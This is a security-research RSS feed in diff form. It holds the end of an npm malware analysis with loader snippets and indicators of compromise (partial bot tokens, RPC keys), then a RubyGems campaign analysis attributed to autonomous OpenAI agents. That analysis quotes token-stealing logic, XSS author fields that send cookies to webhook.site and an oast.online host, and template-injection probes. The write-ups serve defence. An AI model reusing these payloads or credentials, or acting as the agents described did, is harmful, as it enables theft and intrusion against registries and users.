+**We cannot read any of them.** The payloads are encrypted with asymmetric cryptography, under a key that only two parties can derive. The operator derives it from their own private key and the implant's public key, read from the contract. The implant derives the same key from the operator's public key and its own private key, which is generated at infection time and lives only in the memory of the victim process, never on disk or on the chain. Every blob also uses a unique salt and IV, so there is no nonce reuse to attack. We recovered the entire delivery mechanism and none of the cargo. What the implant was ultimately told to do is the one question this investigation cannot answer.
+
+One curiosity: the contract also contains a complete on-chain file-storage system (chunked upload, metadata, file count). In five months, **not one of those functions was ever called.**
+
+## **A second channel over Slack**
+
+The third blob, fraction.js, is a Slack agent. graph.js decrypts it and launches it as its own detached process on every infection, several steps before the wallet that the contract path requires:
+
+```js
+spawn(process.execPath, [slackAgent, slackSecret, String(process.pid), password], {
+    cwd: __dirname, detached: true, stdio: "ignore", windowsHide: true
+  
+});
+```
+
+It is a separate channel with separate keys. The reporting bot in graph.js only writes; this one only reads, from a different channel, with a different bot. Its credentials are not in the file in readable form: the bot token and channel ID are AES-GCM encrypted under the trigger password, and the messages themselves are encrypted under a Diffie-Hellman secret computed against a server public key hardcoded in the malware. That is not the secret used for blockchain tasking, which is computed against a key fetched from the contract, so the two channels fail independently: cracking one gives you nothing on the other.
+
+```js
+reporting  (graph.js, plain base64, write-only)
+  bot      xoxb-11307403103236-{truncated}
+  channel  C0B8XPGCKQS
+
+tasking    (fraction.js, AES-GCM encrypted, read-only)
+  bot      xoxb-11301867762550-{truncated}
+  channel  C0B8GEPFMK9
+  operator U0B91JWCVT6
+```
+
+The agent polls conversations. history every ten seconds. On startup, it records the timestamp of the latest message and only looks at messages posted after it arrived, so a new victim never replays the operator's back catalogue. It only acts on messages from one hardcoded user ID, so holding the token is not the same as being able to task implants.  
+**The payload arrives as text.** Nothing is downloaded: the agent reads the text and ts fields of a message and nothing else, and slack.com is the only hostname in the module. Each message body decrypts to a JSON packet in a small transfer protocol:
+
+| Packet | Fields | Effect |
+| :---- | :---- | :---- |
+| {t:"s"} | id, name, total | begin a transfer |
+| {t:"c"} | id, n, d | deliver chunk n |
+| {t:"e"} | id | reassemble and run |
+
+```js
+fs.writeFileSync(savePath, assembled, "utf8");   // ...utils/subwatcher
+// fs.chmodSync(savePath, "755");
+// runProcess(savePath);
+```
+
+Slack caps message length, so an executable is split across many messages and rebuilt on the victim. There is no practical ceiling on size. A body containing exitexitexit is treated as an order instead: the agent deletes the infection marker, kills its parent, and exits.
+
+## **The one we could not open**
+
+matrixflow-js@3.2.1 is an ml-matrix reskin with the same loader chain, hooked at the top of the exported solve(). It differs in one way that matters: where mathsbase keys on a value derived from the input (the LU factor), matrixflow-js keys on the caller's raw matrix, compared by SHA-256 against a constant. A key equal to the caller's own input will essentially never match by accident, so this trigger is not waiting for ordinary work: **the input has to be supplied by the operator**, as a demo script or a task handed to a contractor. We could not find it, and its payload is still sealed. Version 3.2.2, published a week later, quietly removed the loader.
+
+## **Following the accounts**
+
+The operators are disciplined about identity: one npm account per package, emails alternating between @proton.me and @outlook.com, accounts abandoned the moment a package is removed. Across every GitHub identity in the cluster, there are **zero followers and zero following**, and not one campaign repository has a stargazer. We mapped the cluster anyway, through the seams where that discipline failed.
+
+**A handle reused across providers.** The npm account weed0 publishes from tinystar368@gmail.com; tinystar8, which published the backdoored mathsbase, uses tinystar368@proton.me. That single collision joined the DeFi persona packages to the malware cluster, and commit metadata confirmed it: the GitHub identity UmajiHidekata, which hosts the inflation tool and commits to its target list, signs as tinystar368@gmail.com. The tool itself was written by a fourth identity, andrewstory18, whose commit opens the repository's history.
+
+**Repositories, where they exist at all.** Only two of the five malicious packages have a public GitHub repository behind them — tinystar8/mathsbase and mathubio/math-universe. allendev12 was deleted along with its account, and linnianping and robert92 never published one. Where a repository does exist it is a clone of the real project with its upstream history left intact: tinystar8/mathsbase carries all 5,694 mathjs commits, 3,674 of them still signed by mathjs's own author, with 136 mechanical rename commits by Blustdp layered on top. The effect is a repository that looks like a long-maintained library at a glance, and the rename commits are the only trace of the operators in it.
+
+That is also the limit of what the repositories tell us. **None of the malicious code was ever committed to GitHub.** We searched the full history of every repository in the cluster for the loader's primitives — scryptSync, aes-256-gcm, the beacon IP — and found nothing. The payload is injected at publish time and exists only in the npm tarball, which is why the repositories look clean to anyone who checks them instead of the package.
+
+## **The download factories**
+
+Millions of downloads in two days after release is not organic. Studying the repositories behind the accounts above uncovered the mechanism: a download farm in three public GitHub accounts, repositories worker1 through worker10, running on GitHub's own infrastructure.
+
+| Operator | Repositories | First commit | Commits |
+| :---- | :---- | :---- | :---- |
+| andrewstory18 | worker1–10 | 2026-07-13 | ~4,800 |
+| davidbabcock96 | job_worker1–10 | **2026-06-25** | 5,317 |
+| azlanrahman322-creator | job-worker1–10 | 2026-07-01 | 5,225 |
+
+All of repositories ship an identical WASM decoder (md5 91e020c13cb97a6365135b53b0d0fe5f), every commit carries the message "Update commands from job_master"**,** and the two newer farms receive byte-identical commands.json pushes down to the individual download counts. That is one orchestrator fanning a single configuration out to multiple operators. job_master itself is not public, but its output is.
+
+![](/img/RealTimePostImage/post/equation-of-compromise/image5.png)
+
+	downloads farm activity
+
+Each repository holds the same four files:
+
+```js
+commands.json                       ← AES-encrypted package names + counts
+index.js                            ← minified driver
+pkg/worker_wasm_bg.wasm             ← Rust decoder, 122 KB
+.github/workflows/run-worker.yml    ← runs index.js on every push
+```
+
+The driver decrypts a package name, resolves its tarball URL and downloads it count times at one-second intervals — then throws the bytes away. It only needs the request to complete so npm's telemetry records a download.
+
+The target list is encrypted so the repository never names its own victims:
+
+
+```json
+[
+  { "name": "JcrvKzoIHPVLKIOa4bS7SYwlHtYmQU2rFZhsCjVhU+Lxhc1DL4h+ZT9KXJuoIVHmIBwG", "count": 6882 },
+  { "name": "uIznVb+PhIo5qQ6z1dP587rkA9iHoJNZ07FlIruyN+FcqHTZi52L9BppZaPpTt/pWw4=", "count": 2261 }
+]
+```
+
+The encryption is not much of an obstacle: the AES-256-GCM key is compiled into the WASM in plain ASCII as npm_workvr_protect_key_v1. They encrypted the target list so the public repository would not name its own victims, then shipped the key in the same repository.  
+build_metadata_url is a pure string-to-string function. That recovered unique target packages and the full scheduling history. 
+
+| Package | Scheduled downloads |
+| :---- | :---- |
+| events-sync | 40,715,826 |
+| events-channel | 38,217,963 |
+| indexed-btree | 37,969,615 |
+| quick-events | 37,896,325 |
+| btree-core | 37,657,103 |
+| amm-strategy-backtester | 19,060,693 |
+| @oliviamcdaniel12/safer-buffer | 17,957,387 |
+| matrixflow-js | 14,767,050 |
+| matrixhub | 11,697,230 |
+| matrix-ops-core | 10,890,210 |
+
+## **What we could not answer**
+
+* **What the implant was told to do.** Fifteen tasks payloads, all sealed under an ephemeral X25519 secret. The targeting of quantitative and DeFi developers is inferred from the lures and the lusolve trigger, not from a recovered payload.  
+* **matrixflow-js@3.2.1.** It keys on the caller's raw matrix, so there is no reduced search space; the value is almost certainly supplied by the operator alongside the lure.  
+* **The pre-July inflation mechanism.** At least one package with 2.56M downloads was inflated by something that is not the worker farm.
+
+## **For defenders**
+
+* If you consume any mathjs-shaped package, check for two files that **do not exist in upstream mathjs**: lib/cjs/utils/event.js and lib/cjs/utils/graph.js. Their presence is conclusive and, unlike a hash, survives repacking.  
+* A subwatcher file at mode 755 under lib/cjs/utils/ means the payload has already executed. A package LICENSE ending in REDISTRIBUTION REQUIRES INCLUSION OF THIS LICENSE. means the host is actively infected.  
+* On the registry side, the durable signal is **over a million downloads with zero dependent packages and zero dependent repositories**. It held for every vehicle here. Note that npm's dependencies:<pkg> search qualifier is not supported and silently degrades to fuzzy matching; use ecosyste.ms or libraries.io for reverse-dependency data.  
+* Behaviourally: any package exposing the mathjs API whose lusolve/lup path reaches crypto, path, child_process or https; a fixed ten-second poll to slack.com/api/conversations.history with no jitter; and outbound JSON-RPC to Sepolia from a developer workstation or build agent.  
+* Rotate anything a compromised workstation could reach, and treat the clean-but-inflated packages listed below as pending rather than safe: the operators publish clean and weaponise roughly a day later.
+
+## **Summary**
+
+What we are watching is a sophisticated operation that has been running for months and is still evolving. Its lures are aimed at developers doing quantitative and DeFi work, and every layer of it changes on its own schedule: the trigger design differs from package to package, the command channel has two independent paths, and the packages, publisher accounts and GitHub organisations behind them are disposable, created in minutes and abandoned the moment a package is removed. A download farm gives each new package the look of an established library before it is weaponised, and it is still running as we write. JFrog customers using Xray and Curation can detect and block these malicious packages, and JFrog Catalog users can view the updated campaign package list with the "Equation of Compromise" label.
+
+Our investigation is continuing. There are payloads we have not decrypted, and an orchestrator we have not found, and the operators are still publishing. We will update this article as we learn more.
+
+## **Indicators of compromise**
+
+### **Malicious packages, live at time of writing**
+
+| package | version | date |  |
+| :---- | :---- | ----- | ----- |
+| modern-events | 1.3.3, 1.3.4, 1.4.0, 1.4.1, 1.4.2, 1.4.3, 1.4.4, 1.5.0, 1.5.1, 1.5.2 | 2026-03-03 | XRAY-968383  |
+| quick-events | 2.1.3 | 2026-04-23 | XRAY-990105 |
+| @ignacionunez91/keccak24 | 1.0.7 | 2026-05-05 | XRAY-1005328   |
+| crypto-hasher | 3.1.2, 3.1.3 | 2026-05-06 | XRAY-1027597 |
+| events-router | 2.1.4 | 2026-05-22 | XRAY-990103   |
+| events-runtime | 3.1.3, 3.2.0, 3.2.1, 3.2.3, 3.2.4, 3.3.0 | 2026-06-08 | XRAY-1002132   |
+| sort-btree | 2.1.6, 2.2.0 | 2026-06-14 | XRAY-1007137   |
+| ordered-btree | 3.2.2 | 2026-06-18 | XRAY-1007133   |
+| indexed-btree | 2.1.2 | 2026-06-18 | XRAY-1089213   |
+| @andrewstory18/is-real-odd | 2.0.3 | 2026-06-30 | XRAY-1036540   |
+| @oliviamcdaniel12/safer-buffer | 2.2.0, 2.2.1 | 2026-07-10 | XRAY-1026861   |
+| mutex-forge | 2.0.0, 2.0.1, 2.0.2 | 2026-08-11 | XRAY-1051670   |
+| mutex-thread | 1.3.0 | 2026-08-14 | XRAY-1057196   |
+| mutex-core | 2.1.2 | 2026-08-17 | XRAY-1057451   |
+| matrixflow-js | 3.2.1 | 2026-08-18 | XRAY-1057446   |
+| mutex-plus | 3.0.2 | 2026-08-18 | XRAY-1057459   |
+| mutex-lite | 1.4.2 | 2026-08-18 | XRAY-1057455   |
+| matrixkit-js | 1.0.0 | 2026-08-24 | XRAY-1074505   |
+| mathsbase | 1.0.1 | 2026-08-27 | XRAY-1088056   |
+| math-universe | 1.0.0, 1.0.1, 1.0.2 | 2026-09-16 | XRAY-1088055   |
+| mathmain | 1.0.0 | 2026-09-17 | XRAY-1088058   |
+| graphcore-js | 2.3.2, 2.3.4, 2.4.1, 2.4.2 | 2026-03-17 | XRAY-962933 |
+| graphlib-js | 1.2.0, 1.2.1, 1.2.2, 1.3.2, 1.3.3, 1.3.4 | 2026-03-17 | XRAY-952425  |
+| events-channel | 2.3.1, 2.3.2, 2.4.1 | 2026-05-21 | TBA |
+
+### **PuP packages, inflated**
+
+| secure-library-loader | 0.1.0 – 0.1.3 | 2026-08-25 |
+| :---- | :---- | :---- |
+| matrixhub | 6.15.0, 6.15.1 | 2026-08-25 |
+| matrix-ops-core | 1.0.0-1.0.4 | 2026-08-31 |
+
+### **C2 contracts**
+
+Ethereum Sepolia  
+  0x906f019AC38bB572a8f7d8b2cA662D624EDebaff   2026-03-05  WalletDataRegistry  
+  0x2707BbD5CF9b2F7cE37e4913BADC0349272d48cf   2026-03-06  WalletDataRegistry  
+  0x2a8536AdA44816Cb049778d24b75d795987D90b1   2026-03-06  WalletDataRegistry  
+  0x4C0c9B92BB9647fAf45022BA55f02bB0950196de   2026-03-06  WalletDataRegistry  
+  0xDe34270921D37124fd0b64ea3aE4c5062B467418   2026-03-10  WalletDataRegistry  
+  0x315d47b401aC29e97893dec1c85aBBB2791ef2aA   2026-03-10  WalletDataRegistry  
+  0x475B8659A33FB0C2bDB4c60ffdb92bC24d5c4015   2026-03-18  WalletDataRegistry  
+  0xd5A4620278788AcCf388B7Ea5f35f849465728E7   2026-03-18  WalletDataRegistry  
+  0x4b225b742eb31AD0DfD6bc00F8C55650b4394c18   2026-03-18  WalletDataRegistry  
+  0x661e50E19f05E3c0d04fD75891456D1F0A24508D   2026-04-16  WalletDataRegistry  
+  0xc0445F1b679DC46280A0f03F451bdf613b5A0feA   2026-06-08  WebDataRegistry  
+  0x9E4dF8F253Eb439dd9538Fda30cC03B38fD3a631   2026-06-15  WebDataRegistry  
+  0xE390863Dac96a7118C71227C2b099B50cF602D31   2026-06-18  WalletHelloWorld  
+Base Sepolia  
+  0xac0bfC4C48A679b667732128278EACBA1c191894   2026-08-28  WalletHelloWorld
+
+source-level identifiers    PROTOCOL = "HUBMSBAT"   PROTOCOL = "HEIGUNSE"
+
+### **Network** 
+
+**Slack:**  
+workspace A   tasking C0ATC9UKKA4   reporting C0B554AQF1S   operator U0B51HGMGJW / B0B5VRXPHKJ  
+              xoxb-10914929427361-1091493…  
+              xoxb-10751214461892-1089634…
+
+workspace B   tasking C0B8GEPFMK9   reporting C0B8XPGCKQS   operator U0B91JWCVT6 / B0B8Y0V8NUA  
+              xoxb-11301867762550-11301869433…   
+              xoxb-11307403103236-112897671279….  
+              xoxb-11307403103236-11289767127…   (rotated)
+
+**Telegram:**  
+8717417715:AAGZ-24bqk9QAUh  chat -1003968723972  
+8961878831:AAG4WTbRUcbXI5U   chat -1003952553968, -1004489630130  
+8836581068:AAF1e0v1nbMEShE   operator monitoring tool, alerts to @server_alert_0630
+
+### **RPC provider projects**
+
+pair A   eth-sepolia.g.alchemy.com/v2/0E6xblLeXLnZSnn280R-O  
+         sepolia.infura.io/v3/d3d6e819028346a0b973bd5dd371c468  
+pair B   eth-sepolia.g.alchemy.com/v2/D2-TbkB2m05WXSnSDOCDI  
+         sepolia.infura.io/v3/dc7257d09fab42eca2c354c32fec1938  
+pair C   eth-sepolia.g.alchemy.com/v2/NObVGNvMv3xNnlHDx3QYc
+
+### **Files**
+
+lib/cjs/utils/event.js              loader  
+lib/cjs/utils/graph.js              stage 2, base64  
+lib/cjs/utils/fraction.js           stage 3, base64  
+lib/cjs/utils/bignumber/type.js     bundled ethers, ~1.5 MB  
+lib/cjs/utils/subwatcher            dropped payload, mode 755  
+LICENSE ending "REDISTRIBUTION REQUIRES INCLUSION OF THIS LICENSE."  
+Trigger blob: IapMCmvlemBnFaU+3GZ4oF2xOhnczTlDWTO3oCfrHkWp1lSpHdCaeG0qn2neIoTetyRJtQ==
+
+### **Inflation infrastructure**
+
+github.com/andrewstory18/worker1              … worker10  
+github.com/davidbabcock96/job_worker1         … job_worker10  
+github.com/azlanrahman322-creator/job-worker1 … job-worker10  
+github.com/UmajiHidekata/jobworker
+
+WASM md5  91e020c13cb97a6365135b53b0d0fe5f   identical across all 30  
+WASM key  npm_workvr_protect_key_v1          AES-256-GCM, hardcoded
+
+### **Accounts**
+
+| npm account | Email | GitHub |
+| :---- | :---- | :---- |
+| tinystar8 | tinystar368@proton.me | tinystar8 |
+| elenahorn97 | elenahorn97@proton.me | mathubio |
+| allendev12 | allennightgale0812@outlook.com | allendev12 *(deleted)* |
+| linnianping | lin.n.ping@proton.me | MATRIXFLOW-JS |
+| robert92 | robertjohnson8601@… | — |
+| hunterhicks18 | hunterhicks18@proton.me | MatrixHub-Org |
+| jamesmorse82 | jamesmorse82@proton.me | Ops-Core |
+| monawillis412 | mona.willis@outlook.com | GRAPHCORE-JS |
+| andrewstory18 | andrew.story18@outlook.com | andrewstory18 |
+| davidbabcock96 | david.babcock96@outlook.com | davidbabcock96 |
+| — | azlanrahman322@gmail.com | azlanrahman322-creator |
+| — | mattpalmer0602@gmail.com | MattPalmer0602 |
+| weed0 | tinystar368@gmail.com | UmajiHidekata |
+| justin454 | justin.campos454@outlook.com | Blustdp |
+| gerrysmith2026 | gerry.smith2026@outlook.com | gerrysmith2026 |
+| wesleymoses97 | wesley.moses97@outlook.com | EVENTSKIT |
+| josephjordan93 | joseph.jordan93@outlook.com | josephjorden93 |
+| lesstafford24 | lesstafford24@outlook.com | EVENTS-ROUTER |
+| angelinaparrish18 | angelinaparrish18@outlook.com | EVENTS-RUNTIME |
+| — | bradley.steven93@outlook.com | — |
+| — | ignacionunez91@outlook.com | — |
+| moniquemeza22 | moniquemeza22@outlook.com | GRAPHKITORG |
+| ignacionunez91 | ignacionunez91@outlook.com | SORT-BTREE, KECCAK24 |
+
+**GitHub organisations:** QUICK-EVENTS · EVENTSKIT · POWEREVENTS · EVENTS-ROUTER · EVENTS-RUNTIME · EVENTS-CHANNEL · EVENTS-SYNC · EVENTS-SYNCE · MODERN-EVENTS · GRAPHCORE-JS · GRAPHLIB-JS · GRAPHKITORG · CRYPTO-HASHER · KECCAK24 · INDEXED-BTREE · BTREE-CORE · SORT-BTREE · ORDERED-BTREE · MUTEX-CORE · MUTEXTHREAD · MATRIXFLOW-JS · MatrixHub-Org · Ops-Core · ]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[ParaShells: Parallels Desktop Turns Appliance Install Into a Root Shell]]></title>
+            <link>https://jfrog.com/blog/parallels-desktop-turns-appliance-install-into-root-shell/</link>
+            <guid>https://jfrog.com/blog/parallels-desktop-turns-appliance-install-into-root-shell/</guid>
+            <pubDate>Tue, 15 Sep 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[Your Mac runs a vulnerable version of Parallels Desktop. A malicious package, compromised CI job, or other unprivileged process is already running on it. No admin access. No Parallels-signed client. One appliance-install request later, attacker-controlled code runs as root. While testing Desktop 26.4.0 (build 57513) on Apple silicon, we found that an unprivileged local user...]]></description>
+            <content:encoded><![CDATA[Your Mac runs a vulnerable version of Parallels Desktop. A malicious package, compromised CI job, or other unprivileged process is already running on it. No admin access. No Parallels-signed client. One appliance-install request later, attacker-controlled code runs as root. While testing Desktop 26.4.0 (build 57513) on Apple silicon, we found that an unprivileged local user...]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[New packages identified in GemStuffer 'OpenAI Swarm' malicious RubyGems campaign]]></title>
+            <link>https://research.jfrog.com/post/gemstuffer-openai-rubygems/</link>
+            <guid>https://research.jfrog.com/post/gemstuffer-openai-rubygems/</guid>
+            <pubDate>Tue, 15 Sep 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[The JFrog Security Research team investigated the GemStuffer campaign done by rogue OpenAI agents - we found more than 3000 RubyGems packages associated with the coordinated attacks.]]></description>
+            <content:encoded><![CDATA[
+JFrog Security Research is actively monitoring the recent GemStuffer incident, and using our extensive Catalog of RubyGems artifacts, managed to identify **3,022 campaign-associated RubyGems packages, covering 3,315 distinct name/version pairs**. The identified malicious packages used RubyDoc’s documentation workers, the feature that generates reference pages for Ruby packages, to fetch websites and send the results back through RubyGems. Some also attempt to obtain other users' registry API keys. A separate group of malicious packages places JavaScript and template expressions in package metadata. If your service builds documentation or processes uploaded gems, check whether package-controlled files can execute code or inject content into privileged pages. In this blog, we present newly-analyzed malicious payloads related to the attack, our insights, and the full list of packages we found to be associated with the GemStuffer campaign.
+
+<div align="center">
+
+![][image1]
+
+</div>
+
+The [RubyHack investigation, published on September 11](https://www.rubyhack.ai/), linked the May and June activity from the GemStuffer campaign to OpenAI agents, using package contents and overlap with the German wiki incident, in which OpenAI confirmed its agents edited a public wiki. Our work expands the package inventory and examines how representative payloads work.
+
+## Malicious packages created by AI Agents \- which attributes can we observe?&nbsp;
+
+Not all of the packages in the GemStuffer campaign contained malicious Ruby code, e.g. within `evil.rb`, as seen before, but rather in metadata, which made them less convenient to find.
+
+We started by checking the already known package names used in this attack we found reported. Our first dataset had 557 releases, including several versions per Gem.
+
+The first investigation began by looking at the bigger picture \- we looked at releases that were published before and after the known attack windows, and examined them. In a sea of tens of thousands of packages, several ones were immediately obvious:
+
+- Many of the package names had `oai` (OpenAI) in their names.  
+- GPT models are known for overusing the term `probe`, similar to Claude's signature "You're absolutely right\!" or "honest caveat" phrases. We found a large amount of packages with "probe" in their names from the dates of the attacks, all attributed to this campaign.  
+- More terms that were present in package names were `ssrf`, `fetch`, `proxy`, `scrape`, `yard`, and `payload`. We were unable to attribute *all* of them to the campaign, but the vast majority were.  
+- Package names often included suffixes, such as a unix timestamp for their creation date. For example, the suffix of `oaifetchmde1778385544` decodes to May 10 at 03:59:04 UTC. Its first recorded upload was at 03:59:20 UTC, 16 seconds later.  
+- The package names also referenced Lambeth, Wandsworth, and Southwark, whose public meeting calendars and documents the payloads attempted to retrieve. The agent swarm may have used these sites to test the fetching and data-return mechanism as a proof of concept, although the original task prompts are unavailable.  
+- Other packages used disposable names e.g. `zztest4098`, `zmeta7631`, sequential suffixes (`southwarkssrfhack`, `southwarkssrfhack2`, ..., `southwarkssrfhack5`), or long generated strings.  
+- Metadata included more hints. We checked 1,388 distinct author names. Common values included `x`, `a`, `d`, `tmp`, `oai`, `research`, and `SR`. In July, the agents also used the `Testing <Animal>` format (`Testing Buffalo`, `Testing Wolf`, `Test Rhino`, etc). We also found `John Doe` as an author name for several packages.  
+- Dash padded package names such as `a--00cfmapjson726`.
+
+### Attack windows
+
+We observed the following upload windows for the packages affiliated with the campaign:
+
+| Date | First to last upload, UTC | Packages | Releases |
+| :---- | :---- | ----: | ----: |
+| 2026-05-05 | 12:01:29 to 18:44:14 | 5 | 7 |
+| 2026-05-08 | 15:59:43 to 22:18:01 | 48 | 60 |
+| 2026-05-09 | 12:08:43 to 13:02:33 | 7 | 14 |
+| 2026-05-10 | 03:59:20 to 16:44:35 | 6 | 8 |
+| 2026-05-11 | 04:00:37 to 20:34:24 | 295 | 319 |
+| 2026-05-12 | 01:20:14 to 08:01:00 | 2,359 | 2,476 |
+| 2026-05-26 | 19:05:29 to 21:51:51 | 2 | 12 |
+| 2026-05-27 | 03:51:53 to 03:53:01 | 2 | 2 |
+| 2026-06-18 | 17:53:31 to 20:52:56 | 83 | 84 |
+| 2026-07-07 | 03:03:09 to 18:13:42 | 215 | 333 |
+
+## Analysis of the Ruby payloads
+
+### `slnleaker5`: RubyGems token stealer
+
+`slnleaker5` version `0.0.1` explicitly loads `script.rb` through `.yardopts`. Its crawler collects council pages and linked documents, writes an `INDEX.txt` and numbered response files, and builds a child gem named `slnpayloadx` followed by the current timestamp.
+
+The credential logic at lines 96-106 goes beyond using its embedded key. It cycles through four forms of the legacy API-key endpoint, making up to 24 harvest-and-upload attempts. It searches each response for a RubyGems key and falls back to its hardcoded value if none is found:
+
+<div align="center">
+
+![Ruby expression that selects a RubyGems API key matched in the response text, or falls back to the hardcoded KEY value.][image2]
+
+</div>
+
+The selected value is then used as the upload request's `Authorization` header. The script tries several spellings of the upload path and stops on an HTTP 200 response. Those path variations show probing; they do not establish that any normalization bypass worked.
+
+This matches the mechanism later described in [RubyGems' legacy API-key advisory](https://blog.rubygems.org/2026/07/22/security-advisory-legacy-api-key-leak.html). Under the affected compression and cache-header behavior, a successful legacy sign-in response could be cached at a CDN edge and returned to another caller for up to an hour, including an unauthenticated caller. Ruby's default gzip request behavior was relevant to the vulnerable path.
+
+`slnleaker5` was published at **03:15:22.939 UTC on May 12**. RubyGems says the vulnerability was reported on July 6 and the fix was deployed on July 9\. The source therefore shows an attempt to exploit that behavior before the later report.
+
+<div align="center">
+
+![Ruby code from slnleaker5 that cycles through legacy API-key endpoints, extracts a registry key, and attempts gem uploads until an HTTP 200 response.][image3]
+
+</div>
+
+&nbsp;
+
+&nbsp;
+
+### `f2fe-s1`: Collects Wandsworth's data, publishes to separate Gem
+
+In `f2fe-s1` version `0.0.1`, `loader.rb` fetches public meeting calendars and linked documents from Wandsworth’s council website, then attempts to publish the collected data in a new gem named `f2fe-scraped`.
+
+<div align="center">
+
+![Ruby loader from f2fe-s1 that fetches Wandsworth council calendar and web-service endpoints, follows redirects, and collects meeting IDs and document links.][image4]
+
+</div>
+
+The fetch helper at lines 7-18 uses `Net::HTTP`, disables certificate verification, and follows redirects. The loader tries several calendar and web-service endpoints. It supplies eight date-ranges to `GetMeetings`, then extracts meeting IDs and document links from the responses.
+
+The collection keeps up to 150 meeting IDs and 120 document URLs. It stores responses in `p0.txt`, `ids.txt`, and `d0.bin`, then builds a gem named `f2fe-scraped`. Its version is `0.0.` followed by the current Unix timestamp.
+
+<div align="center">
+
+![Ruby code from f2fe-s1 that builds a gem containing collected council data and posts it to RubyGems using an embedded API key.][image5]
+
+</div>
+
+Lines 59-62 build the gem and attempt to POST it to RubyGems' `/api/v1/gems` endpoint using an embedded API key. The registry is the return channel for the collected data.
+
+### `yardxabc889`: Collects Lambeth's data, republishes in same Gem
+
+`yardxabc889` version `0.0.1` uses `.yardopts` to load `evil.rb`.
+
+The script fetches Lambeth’s calendar page and writes up to 500,000 characters of the response, or an error message, into `README.md`. It then removes the payload’s YARD load directive, builds version `0.0.2` of the same gem, `yardxabc889`, and attempts to publish that version with the collected data:
+
+<div align="center">
+
+![Ruby code from yardxabc889 that removes the payload loader from .yardopts and changes the gem version from 0.0.1 to 0.0.2.][image6]
+
+</div>
+
+The replacement `.yardopts` removes `--load ./evil.rb`. The script builds `yardxabc889-0.0.2.gem` and attempts to publish it using an embedded credential.
+
+<div align="center">
+
+![Ruby code from yardxabc889 that rebuilds the modified gem and attempts to publish it to RubyGems using an embedded credential.][image7]
+
+</div>
+
+### `southpxdatapp6pi`: Collects Southwark's data, stores in webhook URLs
+
+Unlike the previous two payloads, `southpxdatapp6pi` version `0.0.1` attempts to store the fetched data in RubyGems webhook configuration rather than publishing it in a gem.
+
+The script requests Southwark's calendar page, prefixes the body with the HTTP status, compresses it with zlib, and applies URL-safe Base64 encoding. It removes padding and splits the result into chunks of at most 220 characters.
+
+For each chunk, it sends a request to `/api/v1/web_hooks`, setting `gem_name` to `southpxdatapp6pi` and placing the data in a URL shaped like this:
+
+```
+https://example.com/A000/<encoded-chunk>
+https://example.com/A001/<encoded-chunk>
+https://example.com/ZZEND/<chunk-count>
+```
+
+<div align="center">
+
+![Ruby code from southpxdatapp6pi that compresses and Base64-encodes a Southwark council response, then stores numbered chunks and an end marker in RubyGems webhook URLs.][image8]
+
+</div>
+
+The write destination in the code is the RubyGems webhook API. `example.com` is embedded in the stored value; nothing in this sample points to a real C2. If the registrations succeed, the response data is held in webhook configuration; a separate reader could reconstruct the ordered chunks. The script also tries to record an `ERR/` marker on failure. This package also uses the same embedded API-key value as `yardxabc889`.
+
+## Analysis of malicious package metadata
+
+The July samples target another set of consumers: RubyGems package pages (ex. Browsed to by users), administrative views, and metadata parsers. They can matter even when the package's Ruby library does almost nothing.
+
+### XSS in descriptions and author fields
+
+Some of the packages contain XSS proof-of-concepts embedded in their metadata, attempting to prove user hijacking, in cases where users view the rendered metadata.
+
+In `xss-test-gem` version `0.1.0`, the only listed Ruby source is:
+
+<div align="center">
+
+![The entire xssgem.rb library: an Xssgem module that only defines VERSION as 0.1.0.][image9]
+
+</div>
+
+The attack strings are in the serialized gemspec's `description`, lines 13-20. They include an image error handler, a script element, a `javascript:` link, and an SVG load handler:
+
+<div align="center">
+
+![Gem metadata containing XSS probes in the description, including an image error handler, a script element, a JavaScript link, and an SVG load handler.][image10]
+
+</div>
+
+Each tests a different rendering path. The same description includes a `data-controller=dump` element and malformed MathML/HTML nesting.
+
+We also found several packages with interesting authors:
+
+| Package | Author |
+| :---- | :---- |
+| `attacker-xss-admin-1@0.0.1` | `"<script>new Image().src=""https://d96877a5q295v25se560q7ntmmwky7x8o.oast.online/admin-xss-author""</script>"` |
+| `xssname-1783397821@0.0.1` | `<img src=x onerror=fetch('https://webhook.site/steal?c='+document.cookie)>` |
+| `test-apex-gem@0.1.3` | `<img src=x onerror=alert(1)>` |
+
+<div align="center">
+
+![Metadata for xss-test-gem showing injected HTML and JavaScript payloads in the package description.][image11]
+
+</div>
+
+### Template expressions and YAML-labeled tests
+
+Three uploads arrived within five seconds on July 7:
+
+| Package | Upload time, UTC | Author |
+| :---- | :---- | :---- |
+| `test-ssti-0@0.1.0` | 07:25:48.110 | `<%= 7*7 %>` |
+| `test-ssti-1@0.1.0` | 07:25:50.094 | `${7*7}` |
+| `test-ssti-4@0.1.0` | 07:25:52.741 | `<%25= 7*7 %>` |
+
+The first is an ERB expression. The second tests expression-language interpolation. The third becomes the ERB form after percent-decoding `%25` to `%`. The arithmetic result would be 49 in a compatible evaluator, giving the operator a simple string to look for.
+
+## Remediation guidance
+
+### Step 1: Check the execution surface
+
+Review CI jobs that processed the identified versions (see full list below). Look for [YARD](https://yardoc.org/) `--load` directives, package-controlled plugins, extension build steps, and requests to generate documentation.
+
+If an untrusted payload ran on a worker, isolate it and preserve the build logs and artifacts. Rebuild the worker from a trusted image before reuse. Rotate credentials that the process could access.
+
+### Step 2: Remove unnecessary worker privileges
+
+Run untrusted documentation builds in disposable environments without registry-publishing keys, cloud credentials, or host mounts. Deny unnecessary outbound access, including access to cloud metadata and internal services. A documentation job that only reads packages should not be able to publish them.
+
+Do not honor arbitrary package-supplied load options in a trusted process. If a service must support executable documentation helpers, treat the entire job as untrusted code execution and isolate it accordingly.
+
+### Step 3: Audit registry credentials and account changes
+
+RubyGems reports that it fixed the cache issue and revoked legacy API keys. Follow their [advisory](https://blog.rubygems.org/2026/07/22/security-advisory-legacy-api-key-leak.html) and inspect account history for unexpected versions, yanks, owner changes, trusted publishers, and webhooks.
+
+Use scoped credentials, MFA that applies to API operations, and short-lived trusted publishing where possible.
+
+### Step 4: Treat metadata as untrusted input
+
+Escape author and description fields in public and administrative views. Where HTML is allowed, use a maintained sanitizer that handles event attributes, URL schemes, SVG, and parser edge cases. Do not pass metadata values back through a template evaluator.
+
+Use restricted metadata deserialization. Inspect suspicious values as text rather than loading gemspec code or unsafe YAML objects.
+
+## IOCs
+
+| Package | Versions | Xray ID |
+| :---- | :---- | :---- |
